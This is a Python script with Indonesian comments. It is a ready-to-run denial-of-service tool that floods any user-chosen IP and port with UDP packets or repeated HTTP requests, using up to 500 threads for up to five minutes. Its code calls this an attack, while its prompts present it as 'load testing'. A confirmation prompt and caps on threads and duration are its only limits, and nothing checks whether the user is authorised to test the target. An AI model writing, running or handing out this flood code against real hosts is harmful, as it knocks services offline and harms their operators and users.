#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import socket
import sys
import time
import threading
import signal
from colorama import Fore, Style, init

init(autoreset=True)

# ====================== KONFIGURASI ======================
MAX_THREADS = 500          # Batas maksimal thread (jangan terlalu tinggi di Termux)
MAX_DURATION = 300         # Maksimal 5 menit (300 detik)

stop_attack = False

def signal_handler(sig, frame):
    global stop_attack
    print(f"\n{Fore.RED}[!] Serangan dihentikan oleh user (Ctrl+C)")
    stop_attack = True

signal.signal(signal.SIGINT, signal_handler)

def clear():
    os.system("clear")

def banner():
    clear()
    print(f"""{Fore.CYAN}
\033[97m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
\033[97m ▒█████╗▒▒███╗▒██╗▒▒▒▒▒██╗▒███╗▒▒██████╗▒▒▒██╗▒▒██╗██╗████████╗▒▒███╗▒▒████╗▒▒███╗▒
\033[97m ▒██╔══╝██╔══██╗██║▒▒▒██║██╔══██╗██╔══██╗▒▒██║▒▒██║██║▒▒▒██╔══╝██╔══██╗██▒████▒██║▒
\033[97m ▒██║▒▒▒██║▒▒██║▒██║▒██║▒██║▒▒██║██║▒▒██║▒▒██║▒▒██║██║▒▒▒██║▒▒▒██║▒▒██║██╔═██╗▒██║▒ 
\033[97m ▒█████╗██║▒▒██║▒▒████║▒▒██║▒▒██║██║▒▒██║▒▒██║▒▒██║██║▒▒▒██║▒▒▒██║▒▒██║██║▒██║▒██║▒
\033[97m ▒╚══██║███████║▒▒▒██╔╝▒▒███████║██║███╔╝▒▒███████║██║▒▒▒██║▒▒▒███████║██║▒██║▒██║▒
\033[97m ▒█████║██╔══██║▒▒▒██║▒▒▒██╔══██║██╔═══╝▒▒▒██╔══██║██║▒▒▒██║▒▒▒██║▒▒██║██║▒╚═╝▒██║▒ 
\033[97m ▒╚════╝╚═╝▒▒╚═╝▒▒▒╚═╝▒▒▒╚═╝▒▒╚═╝╚═╝▒▒▒▒▒▒▒╚═╝▒▒╚═╝╚═╝▒▒▒╚═╝▒▒▒╚═╝▒▒╚═╝╚═╝▒▒▒▒▒╚═╝▒
\033[97m ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
print(f"\033[97m ╔{'═' * 80}╗")
print(f"\033[97m ║ \033[100m{' ' * 4}github{' ' * 63}\033[0m ║")
print(f"\033[97m ║ \033[100m{' ' * 4}zblack57{' ' * 56}\033[0m ║")
print(f"\033[97m ╚{'═' * 80}╝")

# ====================== UDP FLOOD ======================
def udp_flood(ip, port, duration, threads, packet_size=1024):
    global stop_attack
    message = b"X" * packet_size
    target = (ip, port)
    
    def worker():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        count = 0
        while not stop_attack and time.time() < end_time:
            try:
                s.sendto(message, target)
                count += 1
                if count % 500 == 0:  # Kurangi spam print
                    print(f"{Fore.GREEN}[UDP] {count:,} packets sent to {ip}:{port}")
            except:
                pass
        s.close()

    end_time = time.time() + duration
    print(f"{Fore.YELLOW}[+] Memulai UDP Flood dengan {threads} threads...\n")

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)

    # Tunggu sampai selesai atau dihentikan
    for t in thread_list:
        t.join()

# ====================== HTTP FLOOD ======================
def http_flood(ip, port, duration, threads):
    global stop_attack
    
    def worker():
        while not stop_attack and time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\n\r\n".encode()
                s.sendall(request)
                s.close()
            except:
                pass

    end_time = time.time() + duration
    print(f"{Fore.YELLOW}[+] Memulai HTTP Flood dengan {threads} threads...\n")

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

# ====================== MAIN ======================
def main():
    banner()

    # Input Target
    print(f"{Fore.CYAN}┏━━ Target Configuration ━━⬣")
    ip = input(f"{Fore.CYAN}┗> Target IP / Domain : {Fore.WHITE}")
    
    try:
        port = int(input(f"{Fore.CYAN}┗> Port               : {Fore.WHITE}"))
    except:
        print(f"{Fore.RED}Port tidak valid!")
        sys.exit()

    try:
        duration = int(input(f"{Fore.CYAN}┗> Duration (detik)   : {Fore.WHITE}"))
        if duration > MAX_DURATION:
            print(f"{Fore.RED}[!] Maksimal durasi {MAX_DURATION} detik.")
            duration = MAX_DURATION
    except:
        print(f"{Fore.RED}Durasi tidak valid!")
        sys.exit()

    print(f"\n{Fore.CYAN}┏━━ Attack Type ━━⬣")
    print(f"{Fore.WHITE}   [1] UDP Flood")
    print(f"{Fore.WHITE}   [2] HTTP Flood")
    attack_type = input(f"{Fore.CYAN}┗> Pilih (1/2)         : {Fore.WHITE}")

    # Proteksi Konfirmasi
    print(f"\n{Fore.RED}⚠️  PERINGATAN ⚠️")
    print(f"{Fore.YELLOW}Kamu akan melakukan load testing ke {ip}:{port} selama {duration} detik.")
    confirm = input(f"{Fore.WHITE}Ketik 'YA' untuk melanjutkan: {Fore.WHITE}")

    if confirm.upper() != "YA":
        print(f"{Fore.RED}Serangan dibatalkan.")
        sys.exit()

    # Pilih jumlah thread
    try:
        threads = int(input(f"\n{Fore.CYAN}Jumlah Threads (10-{MAX_THREADS}) : {Fore.WHITE}"))
        threads = max(10, min(threads, MAX_THREADS))
    except:
        threads = 100

    print(f"\n{Fore.GREEN}{'='*60}")
    print(f"           LOAD TESTING DIMULAI")
    print(f"{'='*60}\n")

    start_time = time.time()

    try:
        if attack_type == "1":
            udp_flood(ip, port, duration, threads, packet_size=1024)
        elif attack_type == "2":
            http_flood(ip, port, duration, threads)
        else:
            print(f"{Fore.RED}Pilihan tidak valid!")
            sys.exit()
    except KeyboardInterrupt:
        pass
    finally:
        elapsed = int(time.time() - start_time)
        print(f"\n{Fore.GREEN}[✓] Load Testing selesai dalam {elapsed} detik.")
        print(f"{Fore.CYAN}Terima kasih telah menggunakan tool ini dengan bijak.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}\n[!] Program dihentikan.")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")
